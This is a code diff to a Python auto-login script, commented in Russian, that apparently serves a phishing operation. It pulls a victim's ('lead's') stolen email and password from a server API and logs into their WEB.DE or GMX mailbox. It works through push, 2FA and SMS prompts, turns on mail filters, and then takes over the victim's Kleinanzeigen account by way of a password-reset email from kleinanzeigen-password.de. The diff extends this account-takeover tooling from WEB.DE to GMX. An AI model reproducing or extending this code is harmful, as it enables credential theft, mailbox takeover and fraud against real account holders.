@@ -2,7 +2,7 @@
 """
 Автовход WEB.DE для лида по API GMX (режим Auto-script).
 Сервер передаёт лида по API: скрипт получает email/пароль через GET /api/lead-credentials,
-выполняет вход через webde_login.login_webde, результат отправляет в POST /api/webde-login-result.
+выполняет вход через webde_login.login_webde или gmx_login.login_gmx (по домену @gmx.*), результат — POST /api/webde-login-result.
 Лида затем направляют те же функции, что и кнопки в админке (редирект на пуш, смену пароля, ошибку и т.д.).
 
 Аргументы: --server-url BASE --lead-id ID --worker-secret SECRET [--combo-slot N].
@@ -70,16 +70,41 @@ from webde_login import (
     reopen_webde_browser_same_profile,
     save_cookies_for_account,
 )
+from gmx_login import login_gmx
 from cleanup_artifacts import cleanup_login_artifacts
 
 _RUN_PREFIX = ""
 _LOG_EMAIL = ""  # для строки терминала «поток | попытка | email: …»
 # Во время попытки входа WEB.DE: «web.de <индекс пула> | <строка proxy.txt> | попытка/лимит»
 _WEBDE_ATTEMPT_TAG: str | None = None
+_LOG_MAIL_BANNER = ""  # «[GMX]» / «[WEB.DE]» после определения домена ящика; до этого — «[MAIL]»
+
+
+def _mail_provider_from_email(email: str) -> str:
+    """
+    Выбор цепочки автовхода: WEB.DE (auth.web.de) или GMX (auth.gmx.net).
+    Остальные домены — WEB.DE (как раньше), кроме явного списка GMX.
+    """
+    e = (email or "").strip().lower()
+    if not e or "@" not in e:
+        return "webde"
+    dom = e.rsplit("@", 1)[-1].strip()
+    gmx_suffixes = (
+        "gmx.de",
+        "gmx.net",
+        "gmx.at",
+        "gmx.ch",
+        "gmx.com",
+        "gmx.eu",
+        "gmx.org",
+    )
+    if dom in gmx_suffixes or dom.endswith(".gmx.net"):
+        return "gmx"
+    return "webde"
 
 
 def _log(step: str, message: str, detail: str = "", *, verbose_only: bool = False):
-    """Кратко: [WEB.DE] или [KLEIN-ORCH] | email | сообщение. Подробности: WEBDE_VERBOSE_LOG=1."""
+    """Кратко: [GMX]/[WEB.DE]/[MAIL] или [KLEIN-ORCH] | email | сообщение. Подробности: WEBDE_VERBOSE_LOG=1."""
     if verbose_only and not _WEBDE_VERBOSE_LOG:
         return
     if not _WEBDE_VERBOSE_LOG and step == "==========":
@@ -90,7 +115,7 @@ def _log(step: str, message: str, detail: str = "", *, verbose_only: bool = Fals
     if step == "KLEIN-ORCH" or (isinstance(step, str) and step.startswith("KLEIN")):
         banner = "[KLEIN-ORCH]"
     else:
-        banner = "[WEB.DE]"
+        banner = (_LOG_MAIL_BANNER or "[MAIL]").strip() or "[MAIL]"
     tag_prefix = ""
     if _WEBDE_ATTEMPT_TAG and not (
         step == "KLEIN-ORCH" or (isinstance(step, str) and step.startswith("KLEIN"))
@@ -220,13 +245,13 @@ KLEIN_WRONG_CREDENTIALS_MSG_DE = (
     "Bitte überprüfe deine Eingaben."
 )
 
-# Подписи EVENTS — дублируют EVENT_LABELS в server.js (script-event и согласованность с админкой).
+# Подписи EVENTS — дублируют EVENT_LABELS в src/utils/formatUtils.js (script-event и админка).
 EV_MAIL_FILTERS_START = "Включение фильтров на почте"
 EV_MAIL_FILTERS_OK = "Фильтры включены"
 EV_KLEIN_START = "Запуск Klein"
 EV_SUCCESS_KL = "Успешный вход Kl"
-EV_WEBDE_BROWSER = "WEB.DE: браузер готов"
-EV_WEBDE_MAIL_OPENED = "WEB.DE: почтовый ящик открыт"
+EV_WEBDE_BROWSER = "Автовход: браузер готов"
+EV_WEBDE_MAIL_OPENED = "Почтовый ящик открыт"
 EV_MAIL_UI_READY = "Почта: интерфейс подготовлен"
 EV_KLEIN_SESSION_MAIL = "Klein: сессия почты в браузере"
 EV_KLEIN_WAIT_VICTIM = "Klein: ждём email из письма (kleinanzeigen-password.de), до 3 мин"
@@ -234,10 +259,10 @@ EV_KLEIN_VICTIM_HERE = "Klein: лид на странице входа"
 EV_KLEIN_CREDS_FROM_LEAD = "Klein: данные для входа получены"
 EV_KLEIN_RESET_START = "Klein: сброс пароля (Passwort vergessen)"
 EV_KLEIN_RESET_DONE = "Klein: вход после сброса пароля"
-EV_WEBDE_SCREEN_PUSH = "WEB.DE: на экране Push"
-EV_WEBDE_SCREEN_2FA = "WEB.DE: на экране 2FA"
-EV_WEBDE_SCREEN_SMS = "WEB.DE: на экране SMS"
-EV_TWO_FA_CODE_IN = "2FA: код получен, ввод на WEB.DE"
+EV_WEBDE_SCREEN_PUSH = "На экране Push (почта)"
+EV_WEBDE_SCREEN_2FA = "На экране 2FA (почта)"
+EV_WEBDE_SCREEN_SMS = "На экране SMS (почта)"
+EV_TWO_FA_CODE_IN = "2FA: код получен, ввод в почте"
 
 
 def send_result(
@@ -485,6 +510,7 @@ def _execute_klein_orchestration_after_mail(
     email: str,
     *,
     headless: bool,
+    mail_provider: str = "webde",
 ) -> None:
     """
     Playwright: почта WEB.DE залогинена, браузер удержан (прокси, fp-пул, куки).
@@ -1178,9 +1204,10 @@ def _run_main(
     klein_orchestration: bool = False,
     combo_slot: int | None = None,
 ) -> None:
-    global _RUN_PREFIX, _LOG_EMAIL, _WEBDE_ATTEMPT_TAG
+    global _RUN_PREFIX, _LOG_EMAIL, _WEBDE_ATTEMPT_TAG, _LOG_MAIL_BANNER
     _LOG_EMAIL = ""
     _WEBDE_ATTEMPT_TAG = None
+    _LOG_MAIL_BANNER = ""
     _RUN_PREFIX = f"[lead:{lead_id[:10]}]"
     _log(
         "СТАРТ",
@@ -1268,7 +1295,9 @@ def _run_main(
         sys.exit(1)
 
     _LOG_EMAIL = email
-    _log("ДАННЫЕ", f"email · пароль {'есть' if password else 'нет (по API)'}")
+    mail_provider = _mail_provider_from_email(email)
+    _LOG_MAIL_BANNER = "[GMX]" if mail_provider == "gmx" else "[WEB.DE]"
+    _log("ДАННЫЕ", f"провайдер почты: {mail_provider} · email · пароль {'есть' if password else 'нет (по API)'}")
     _log("ДИАГНО", f"lead_id для API: {lead_id!r} (символов: {len(lead_id)})", verbose_only=True)
     _log("ДИАГНО", f"server_url: {base_url.rstrip('/')!r}", verbose_only=True)
     if automation_profile and isinstance(automation_profile, dict):
@@ -1478,15 +1507,25 @@ def _run_main(
     if not headless:
         _log("ВХОД", "браузер с окном (видно действия)", verbose_only=True)
     if klein_orchestration:
-        _log("ВХОД", "Klein-оркестрация · фаза 1/2: почта WEB.DE (auth.web.de), затем вход на Kleinanzeigen")
+        _log(
+            "ВХОД",
+            "Klein-оркестрация · фаза 1/2: почта (WEB.DE/GMX), затем Kleinanzeigen",
+        )
         script_event(
             base_url,
             lead_id,
             worker_secret,
-            "Klein-оркестрация · фаза 1 — почта WEB.DE: браузер готов",
+            "Klein-оркестрация · фаза 1 — почта: браузер готов",
         )
     else:
-        _log("ВХОД", "запуск auth.web.de (email → капча → пароль)")
+        _log(
+            "ВХОД",
+            (
+                "запуск auth.gmx.net (GMX) — email → капча → пароль"
+                if mail_provider == "gmx"
+                else "запуск auth.web.de (WEB.DE) — email → капча → пароль"
+            ),
+        )
         script_event(base_url, lead_id, worker_secret, EV_WEBDE_BROWSER)
 
     def on_push_wait_start():
@@ -1765,11 +1804,11 @@ def _run_main(
                 ps[:120],
             )
 
-        evt_attempt = (
-            f"Klein-оркестрация · фаза 1 — почта: попытка входа · №{one_based} из {_attempts_cap_str}"
-            if klein_orchestration
-            else f"WEB.DE: попытка входа · №{one_based} из {_attempts_cap_str}"
-        )
+        _prov_ru = "GMX" if mail_provider == "gmx" else "WEB.DE"
+        if klein_orchestration:
+            evt_attempt = f"Klein-оркестрация · фаза 1 — почта: попытка входа · №{one_based} из {_attempts_cap_str}"
+        else:
+            evt_attempt = f"Автовход ({_prov_ru}): попытка №{one_based} из {_attempts_cap_str}"
         script_event(base_url, lead_id, worker_secret, evt_attempt)
 
         def _standard_after_mail_hook():
@@ -1791,14 +1830,20 @@ def _run_main(
             _close_browser_keep_open_optional(browser, headless=headless)
 
         def _klein_after_mail_hook():
-            """Вызов в finally login_webde, пока sync_playwright() ещё открыт — иначе фильтры падают (Event loop is closed)."""
+            """Вызов в finally login_*, пока sync_playwright() ещё открыт — иначе фильтры падают (Event loop is closed)."""
             script_event(base_url, lead_id, worker_secret, EV_WEBDE_MAIL_OPENED)
             _execute_klein_orchestration_after_mail(
-                base_url, lead_id, worker_secret, email, headless=headless
+                base_url,
+                lead_id,
+                worker_secret,
+                email,
+                headless=headless,
+                mail_provider=mail_provider,
             )
 
         try:
-            result = login_webde(
+            _login_mail = login_gmx if mail_provider == "gmx" else login_webde
+            result = _login_mail(
                 email=email,
                 password=password or None,
                 headless=headless,
@@ -1880,7 +1925,7 @@ def _run_main(
                 _log("==========", "END SESSION", verbose_only=True)
                 return
             else:
-                _log("ОШИБКА", f"неожиданный результат login_webde: {result!r}")
+                _log("ОШИБКА", f"неожиданный результат login_* ({mail_provider}): {result!r}")
                 last_error_code = "500"
                 last_error_message = str(result)[:200]
                 advance_grid_step(
